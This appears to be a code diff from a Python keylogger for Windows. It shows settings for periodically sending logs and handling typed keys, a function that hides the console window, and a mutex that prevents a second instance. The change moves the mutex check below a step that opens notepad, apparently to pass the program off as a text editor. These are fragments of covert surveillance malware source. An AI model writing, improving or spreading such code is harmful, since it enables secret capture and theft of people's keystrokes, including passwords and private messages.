@@ -26,12 +26,6 @@ strTimePerSend = 120  # set how often to send logs in seconds
 
 blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
 
-# function to prevent multiple instances
-mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-    mutex = None
-    exit()
-
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
@@ -42,6 +36,12 @@ objTimer = threading.Timer(0, hide);objTimer.start()
 # open file in notepad if argument is given
 if len(sys.argv) == 2:
     OpenNotepad = subprocess.Popen([os.environ["windir"]+"\\notepad.exe", sys.argv[1]])
+    
+# function to prevent multiple instances
+mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    exit()
 
 blnStop = "False"
 
